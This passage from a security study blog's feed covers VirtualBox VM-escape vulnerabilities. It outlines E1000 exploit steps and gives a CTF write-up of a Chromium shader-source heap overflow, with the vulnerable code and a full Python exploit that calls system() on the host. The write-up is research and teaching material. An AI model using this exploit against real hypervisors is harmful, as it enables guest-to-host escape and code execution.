class="literal">true</span></span><br></pre></td></tr></table></figure><p>可以绕过校验非法改长度，达到堆溢出。具体代码不粘了。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul><li>攻击者先卸载Linux guest虚拟机中默认加载的e1000.ko并加载漏洞利用的LKM。</li><li>LKM根据数据表初始化E1000，仅初始化发送部分即可。</li><li>LKM禁用E1000环回模式<ol><li>LKM禁用E1000环回模式，使得堆栈缓冲区溢出代码不可达。</li><li>LKM利用漏洞造成堆缓冲区溢出。</li><li>堆缓冲区溢出可用E1000 EEPROM在128KB范围内写入任意两个字节，攻击者获得写原语。</li><li>LKM利用写原语8次，将数据写入堆中ACPI（高级配置和电源接口）数据结构。写入堆缓冲区索引变量后从中读取单字节，因为缓冲区大小小于最大索引号255，攻击者可读缓冲区，获得读原语。</li><li>LKM使用读原语8次访问ACPI并从堆中读8字节数据（VBoxDD.so共享库指针）</li><li>LKM将指针减去RVA即可拿到VBoxDD.so库。</li></ol></li><li>LKM启用E1000环回模式<ol><li>LKM启用E1000环回模式，使得堆栈缓冲区溢出代码可达。</li><li>LKM利用漏洞造成栈溢出，返回地址（RIP/EIP）被覆盖，攻击者获得控制权。</li><li>利用ROP链执行shellcode。</li></ol></li><li>执行shellcode<ol><li>shellcode加载器从栈处载入shellcode执行。</li><li>shellcode利用fork和execve系统调用执行进程。</li></ol></li><li>攻击者卸载LKM并加载e1000.ko并恢复网络。</li></ul><h2 id="48小时逃逸Virtualbox虚拟机——记一次CTF中的0day之旅"><a href="#48小时逃逸Virtualbox虚拟机——记一次CTF中的0day之旅" class="headerlink" title="48小时逃逸Virtualbox虚拟机——记一次CTF中的0day之旅"></a>48小时逃逸Virtualbox虚拟机——记一次CTF中的0day之旅</h2><p><a href="https://zhuanlan.zhihu.com/p/58910752" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/58910752</a></p><p><a href="https://xz.aliyun.com/t/5008" target="_blank" rel="noopener">https://xz.aliyun.com/t/5008</a></p><h3 id="漏洞点简介"><a href="#漏洞点简介" class="headerlink" title="漏洞点简介"></a>漏洞点简介</h3><p>virtualbox通过引入OpenGL的共享库来引入3D加速功能，而Chromium负责解析Virtualbox。Chromium定义了一套用来描述OpenGL不同操作的网络协议。3D加速是作为一个virtualbox自定义的hgcm服务进程存在的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crUnpackExtendShaderSource</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    GLint *length = <span class="literal">NULL</span>;</span><br><span class="line">    GLuint shader = READ_DATA(<span class="number">8</span>, GLuint);</span><br><span class="line">    GLsizei count = READ_DATA(<span class="number">12</span>, GLsizei);</span><br><span class="line">    GLint hasNonLocalLen = READ_DATA(<span class="number">16</span>, GLsizei);</span><br><span class="line">    GLint *pLocalLength = DATA_POINTER(<span class="number">20</span>, GLint);</span><br><span class="line">    <span class="keyword">char</span> **ppStrings = <span class="literal">NULL</span>;</span><br><span class="line">    GLsizei i, j, jUpTo;</span><br><span class="line">    <span class="keyword">int</span> pos, pos_check;</span><br><span class="line">    ​</span><br><span class="line">    <span class="keyword">if</span> (count &gt;= UINT32_MAX / <span class="keyword">sizeof</span>(<span class="keyword">char</span> *) / <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        crError(<span class="string">"crUnpackExtendShaderSource: count %u is out of range"</span>, count);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ​</span><br><span class="line">    pos = <span class="number">20</span> + count * <span class="keyword">sizeof</span>(*pLocalLength);</span><br><span class="line">    ​</span><br><span class="line">    <span class="keyword">if</span> (hasNonLocalLen &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        length = DATA_POINTER(pos, GLint);</span><br><span class="line">        pos += count * <span class="keyword">sizeof</span>(*length);</span><br><span class="line">    &#125;</span><br><span class="line">    ​</span><br><span class="line">    pos_check = pos;</span><br><span class="line">    ​</span><br><span class="line">    <span class="keyword">if</span> (!DATA_POINTER_CHECK(pos_check))</span><br><span class="line">    &#123;</span><br><span class="line">        crError(<span class="string">"crUnpackExtendShaderSource: pos %d is out of range"</span>, pos_check);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ​</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pLocalLength[i] &lt;= <span class="number">0</span> || pos_check &gt;= INT32_MAX - pLocalLength[i] || !DATA_POINTER_CHECK(pos_check))</span><br><span class="line">        &#123;</span><br><span class="line">            crError(<span class="string">"crUnpackExtendShaderSource: pos %d is out of range"</span>, pos_check);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    ​</span><br><span class="line">        pos_check += pLocalLength[i];</span><br><span class="line">    &#125;</span><br><span class="line">    ​</span><br><span class="line">    ppStrings = crAlloc(count * <span class="keyword">sizeof</span>(<span class="keyword">char</span>*));</span><br><span class="line">    <span class="keyword">if</span> (!ppStrings) <span class="keyword">return</span>;</span><br><span class="line">    ​</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        ppStrings[i] = DATA_POINTER(pos, <span class="keyword">char</span>);</span><br><span class="line">        pos += pLocalLength[i];</span><br><span class="line">        <span class="keyword">if</span> (!length)</span><br><span class="line">        &#123;</span><br><span class="line">            pLocalLength[i] -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    ​</span><br><span class="line">        Assert(pLocalLength[i] &gt; <span class="number">0</span>);</span><br><span class="line">        jUpTo = i == count <span class="number">-1</span> ? pLocalLength[i] - <span class="number">1</span> : pLocalLength[i];</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; jUpTo; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> *pString = ppStrings[i];</span><br><span class="line">    ​</span><br><span class="line">            <span class="keyword">if</span> (pString[j] == <span class="string">'\0'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Assert(j == jUpTo - <span class="number">1</span>);</span><br><span class="line">                pString[j] = <span class="string">'\n'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">​</span><br><span class="line"><span class="comment">//    cr_unpackDispatch.ShaderSource(shader, count, ppStrings, length ? length : pLocalLength);</span></span><br><span class="line">    cr_unpackDispatch.ShaderSource(shader, <span class="number">1</span>, (<span class="keyword">const</span> <span class="keyword">char</span>**)ppStrings, <span class="number">0</span>);</span><br><span class="line">    ​</span><br><span class="line">    crFree(ppStrings);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此方法使用宏READ_DATA获取用户数据。它只需读取客户机使用HGCM接口发送的消息(此消息存储在堆中)。然后调整输入并将其传递给cr_unpackDispatch.ShaderSource()。</p><p>实际的漏洞不太明显。即在第一个循环中，pos_check增加了一个数组的长度。在每次迭代中，都会验证地址，以确保总长度仍然在范围内。这段代码的问题是，pos_check只在下一次迭代中测试是否越界。这意味着数组的最后一个元素从未经过测试，并且可以任意大。</p><p>缺少验证会产生什么影响？本质上，在嵌套循环中，j表示pString的索引，并从0计数到pLocalLength[i]。这个循环将每个\0字节转换为一个\n字节。对于任意长度，我们可以使循环超出边界，并且由于pString指向堆上的HGCM消息中的数据，这实际上是一个堆溢出问题。</p><p>它可以将越界部分所有的’\0’替换为’\n’：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; jUpTo; ++j)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *pString = ppStrings[i];</span><br><span class="line">    ​</span><br><span class="line">    <span class="keyword">if</span> (pString[j] == <span class="string">'\0'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Assert(j == jUpTo - <span class="number">1</span>);</span><br><span class="line">        pString[j] = <span class="string">'\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><p>信息泄露部分完全与CVE-2018-3055基本相同，重写make_oob_read后通过leak_stuff我们可以泄露一个CRConnection结构体的位置，而niklasb的exp中就是通过修改pHostBuffer和cbHostBuffer来实现任意地址读。因此，当我们有任意地址写的条件之后我们就可以任意地址读了。</p><p>TODO：CVE-2018-3055是什么懒得看，具体方法在下文exp中。</p><h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><p>一个好用的结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CRVBOXSVCBUFFER_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> uiId;</span><br><span class="line">    <span class="keyword">uint32_t</span> uiSize;</span><br><span class="line">    <span class="keyword">void</span>*    pData;</span><br><span class="line">    _CRVBOXSVCBUFFER_t *pNext, *pPrev;</span><br><span class="line">&#125; CRVBOXSVCBUFFER_t;</span><br></pre></td></tr></table></figure><p>把越界写内存后面布置这么一个结构体，然后越界写它的uiSize，再越界写这个buffer的pData，然后再越界写另一个相同的结构体，就可以任意地址写了。</p><ol><li>n次调用alloc_buf，对应的buffer填充为可以触发越界写的部分，从而确保在我们可以越界写的堆后有可用的CRVBOXSVCBUFFER_t结构体。</li><li>通过SHCRGL_GUEST_FN_WRITE_READ使用第n-3个buffer，触发堆越界写，覆盖掉第n-2个buffer的size部分。</li><li>通过SHCRGL_GUEST_FN_WRITE使用第n-2个buffer，触发堆越界写，可以修改第n-1个buffer的uiSize和pData为任意值。</li><li>通过SHCRGL_GUEST_FN_WRITE使用第n-1个buffer，触发任意地址写，写的地址与长度由步骤3控制。</li><li>多次任意地址写可以通过多次反复SHCRGL_GUEST_FN_WRITE第n-2个buffer和第n-1个buffer实现。</li></ol><h4 id="整体利用"><a href="#整体利用" class="headerlink" title="整体利用"></a>整体利用</h4><ol><li>通过越界读泄露一个CRConnection结构体的位置</li><li>配置内存实现任意地址写</li><li>通过任意地址读泄露CRConnection结构体中alloc函数对应地址</li><li>通过alloc函数地址计算VBoxOGLhostcrutil.so库地址，最终泄露libc地址</li><li>修改CRConnection的disconnect函数指针为system</li><li>修改CRConnection的头部为payload</li><li>disconnect对应的client</li></ol><h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"><span class="keyword">from</span> array <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line">​</span><br><span class="line">sys.path.append(os.path.abspath(os.path.dirname(__file__)) + <span class="string">'/lib'</span>)</span><br><span class="line"><span class="keyword">from</span> chromium <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hgcm <span class="keyword">import</span> *</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_oob_read</span><span class="params">(offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        pack(<span class="string">"&lt;III"</span>, CR_MESSAGE_OPCODES, <span class="number">0x41414141</span>, <span class="number">1</span>)</span><br><span class="line">        + <span class="string">'\0\0\0'</span> + chr(CR_EXTEND_OPCODE)</span><br><span class="line">        + pack(<span class="string">"&lt;I"</span>, offset)</span><br><span class="line">        + pack(<span class="string">"&lt;I"</span>, CR_GETUNIFORMLOCATION_EXTEND_OPCODE)</span><br><span class="line">        + pack(<span class="string">"&lt;I"</span>, <span class="number">0</span>)</span><br><span class="line">        + <span class="string">'LEET'</span></span><br><span class="line">        )</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_conn</span><span class="params">(client)</span>:</span></span><br><span class="line">    <span class="string">''' Return a CRConnection address, and the associated client handle '''</span></span><br><span class="line">    <span class="comment"># Spray some buffers of sizes</span></span><br><span class="line">    <span class="comment">#  0x290 = sizeof(CRConnection) and</span></span><br><span class="line">    <span class="comment">#  0x9d0 = sizeof(CRClient)</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">600</span>):</span><br><span class="line">        alloc_buf(client, <span class="number">0x290</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">600</span>):</span><br><span class="line">        alloc_buf(client, <span class="number">0x9d0</span>)</span><br><span class="line">​</span><br><span class="line">    <span class="comment"># This will allocate a CRClient and CRConnection right next to each other.</span></span><br><span class="line">    new_client = hgcm_connect(<span class="string">"VBoxSharedCrOpenGL"</span>)</span><br><span class="line">​</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        alloc_buf(client, <span class="number">0x290</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        alloc_buf(client, <span class="number">0x9d0</span>)</span><br><span class="line">​</span><br><span class="line">    hgcm_disconnect(new_client)</span><br><span class="line">​</span><br><span class="line">    <span class="comment"># Leak pClient member of CRConnection struct, and from that compute</span></span><br><span class="line">    <span class="comment"># CRConnection address.</span></span><br><span class="line">    msg = make_oob_read(OFFSET_CONN_CLIENT)</span><br><span class="line">    leak = crmsg(client, msg, <span class="number">0x290</span>)[<span class="number">16</span>:<span class="number">24</span>]</span><br><span class="line">    pClient, = unpack(<span class="string">"&lt;Q"</span>, leak[:<span class="number">8</span>])</span><br><span class="line">    pConn = pClient + <span class="number">0x9e0</span></span><br><span class="line">    new_client = hgcm_connect(<span class="string">"VBoxSharedCrOpenGL"</span>)</span><br><span class="line">    set_version(new_client)</span><br><span class="line">    <span class="keyword">return</span> new_client, pConn, pClient</span><br><span class="line">​</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self, where, what)</span>:</span></span><br><span class="line">        pay = <span class="string">'A'</span>*<span class="number">8</span>+pack(<span class="string">"&lt;Q"</span>,where)</span><br><span class="line">        buf,_,_,_=hgcm_call(self.client1,<span class="number">13</span>,[self.write_buf,self.write_buf_size,<span class="number">0x40</span>,pay])</span><br><span class="line"></span><br><span class="line">        hgcm_call(self.client1,<span class="number">13</span>,[<span class="number">0x41414141</span>,<span class="number">0x41414141</span>,<span class="number">0</span>,what])</span><br><span class="line">​</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write64</span><span class="params">(self, where, what)</span>:</span></span><br><span class="line">        self.write(where, pack(<span class="string">"&lt;Q"</span>, what))</span><br><span class="line">​</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(self, where, n, canfail=False)</span>:</span></span><br><span class="line">        <span class="comment"># Set pHostBuffer and cbHostBuffer, then read from the Chromium stream.</span></span><br><span class="line">        self.write64(self.pConn + OFFSET_CONN_HOSTBUF, where)</span><br><span class="line">        self.write64(self.pConn + OFFSET_CONN_HOSTBUFSZ, n)</span><br><span class="line">        res, sz = hgcm_call(self.client3, SHCRGL_GUEST_FN_READ, [<span class="string">"A"</span>*<span class="number">0x1000</span>, <span class="number">0x1000</span>])</span><br><span class="line">        <span class="keyword">if</span> canfail <span class="keyword">and</span> sz != n:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">assert</span> sz == n</span><br><span class="line">        <span class="keyword">return</span> res[:n]</span><br><span class="line">​</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read64</span><span class="params">(self, where, canfail=False)</span>:</span></span><br><span class="line">        leak = self.read(where, <span class="number">8</span>, canfail)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> leak:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> unpack(<span class="string">'&lt;Q'</span>, leak)[<span class="number">0</span>]</span><br><span class="line">​</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_stuff</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.client1 = hgcm_connect(<span class="string">"VBoxSharedCrOpenGL"</span>)</span><br><span class="line">        set_version(self.client1)</span><br><span class="line">​</span><br><span class="line">        self.client2 = hgcm_connect(<span class="string">"VBoxSharedCrOpenGL"</span>)</span><br><span class="line">        set_version(self.client2)</span><br><span class="line">​</span><br><span class="line">        <span class="comment"># TODO maybe spray even more?</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">400</span>): alloc_buf(self.client1, <span class="number">0x290</span>)</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">400</span>): alloc_buf(self.client1, <span class="number">0x9d0</span>)</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">600</span>): alloc_buf(self.client1, <span class="number">0x30</span>)</span><br><span class="line">​</span><br><span class="line">        <span class="comment"># self.master_id, self.master, _ = leak_buf(self.client1)</span></span><br><span class="line">        <span class="comment"># print('[*] Header for buffer # %d is at 0x%016x (master)' % (self.master_id, self.master))</span></span><br><span class="line">        <span class="comment"># self.victim_id, self.victim, _ = leak_buf(self.client1)</span></span><br><span class="line">        <span class="comment"># print('[*] Header for buffer # %d is at 0x%016x (victim)' % (self.victim_id, self.victim))</span></span><br><span class="line">​</span><br><span class="line">        self.client3, self.pConn, _ = leak_conn(self.client1)</span><br><span class="line">        print(<span class="string">'[*] Leaked CRConnection @ 0x%016x'</span> % self.pConn)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setup_write</span><span class="params">(self)</span>:</span></span><br><span class="line">        msg = pack(<span class="string">"&lt;III"</span>, CR_MESSAGE_OPCODES, <span class="number">0x41414141</span>, <span class="number">1</span>) \</span><br><span class="line">              + <span class="string">'\0\0\0'</span> + chr(CR_EXTEND_OPCODE) \</span><br><span class="line">              + <span class="string">'aaaa'</span> \</span><br><span class="line">              + pack(<span class="string">"&lt;I"</span>, CR_SHADERSOURCE_EXTEND_OPCODE) \</span><br><span class="line">              + pack(<span class="string">"&lt;IIIII"</span>, <span class="number">0</span>, <span class="number">0x2</span>, <span class="number">0</span>, <span class="number">0x1</span>, <span class="number">0x1a</span>+<span class="number">2</span>) +<span class="string">'A'</span>*<span class="number">4</span></span><br><span class="line">        bufs = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x1000</span>):</span><br><span class="line">            bufs.append(alloc_buf(self.client1, len(msg), msg))</span><br><span class="line">        _, res, _ = hgcm_call(self.client1, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [bufs[<span class="number">-5</span>], <span class="string">"A"</span>*<span class="number">0x50</span>, <span class="number">0x50</span>])</span><br><span class="line">        self.write_buf = <span class="number">0x0a0a0000</span>+bufs[<span class="number">-4</span>];</span><br><span class="line">        self.write_buf_size = <span class="number">0x0a0a30</span>;</span><br><span class="line">​</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.leak_stuff()</span><br><span class="line">        self.setup_write()</span><br><span class="line"></span><br><span class="line">        self.crVBoxHGCMFree = self.read64(self.pConn + OFFSET_CONN_FREE, canfail=<span class="literal">True</span>)</span><br><span class="line">        print(<span class="string">'[*] Leaked crVBoxHGCMFree @ 0x%016x'</span> % self.crVBoxHGCMFree)</span><br><span class="line"></span><br><span class="line">        libbase = self.crVBoxHGCMFree - <span class="number">0x20650</span></span><br><span class="line">        self.system = self.read64(libbase + <span class="number">0x22e3d0</span>, canfail=<span class="literal">True</span>) - <span class="number">0x122ec0</span> + <span class="number">0x4f440</span></span><br><span class="line">        print(<span class="string">'[*] Leaked system @ 0x%016x'</span> % self.system)</span><br><span class="line">​</span><br><span class="line">        self.write64(self.pConn + <span class="number">0x128</span>, self.system)</span><br><span class="line">        self.write(self.pConn, <span class="string">"mousepad /home/c3mousepad /home/c3ctf/Desktop/flag.txt\x00"</span>)</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        self.write64(self.pConn + OFFSET_CONN_HOSTBUF, self.writer_msg)</span></span><br><span class="line"><span class="string">​</span></span><br><span class="line"><span class="string">        hgcm_disconnect(self.client1)</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">​</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p = Pwn()</span><br><span class="line">    p.setup()</span><br><span class="line">    <span class="comment">#if raw_input('you want RIP control? [y/n] ').startswith('y'):</span></span><br><span class="line">    <span class="comment">#    p.rip(0xdeadbeef)</span></span><br></pre></td></tr></table></figure><h3 id="进一步思考"><a href="#进一步思考" class="headerlink" title="进一步思考"></a>进一步思考</h3><p>官方修了两处信息泄露，并没有修溢出，当没有leak里，我们依然有<code>任意地址写</code>和<code>堆越界写</code>。</p><p>我们进一步思考如何利用堆溢出再实现信息泄露：</p><ol><li>在我们可以越界写的Buffer后放一个CR_GETUNIFORMLOCATION_EXTEND的Buffer。</li><li>越界写改大CR_GETUNIFORMLOCATION_EXTEND Buffer的size部分。</li><li>通过WRITE_READ_BUFFERED进入crUnpackExtendGetUniformLocation实现越界读。</li></ol><p>如果在CR_GETUNIFORMLOCATION_EXTEND Buffer之后恰好可以放一个CRClient或者CRConnection的结构体，就可以泄露关键的结构体了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;继Linux内核、浏览器、文档型漏洞，虚拟机应该是最后一块了，（从目前我入门二进制漏洞实战来看。主要是针对VM Ware和Virtual Box。&lt;/p&gt;
&lt;h2 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; class=&quot;headerlink&quot; title=&quot;背景知
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
      <category term="VM" scheme="https://github.com/Cracke-S-J/categories/CVE/VM/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
      <category term="VM" scheme="https://github.com/Cracke-S-J/tags/VM/"/>
    
  </entry>
  
  <entry>
    <title>文档型漏洞入门学习</title>
    <link href="https://github.com/Cracke-S-J/2020/05/04/%E6%96%87%E6%A1%A3%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/Cracke-S-J/2020/05/04/%E6%96%87%E6%A1%A3%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-05-04T15:04:45.000Z</published>
    <updated>2020-05-20T09:12:09.710Z</updated>
    
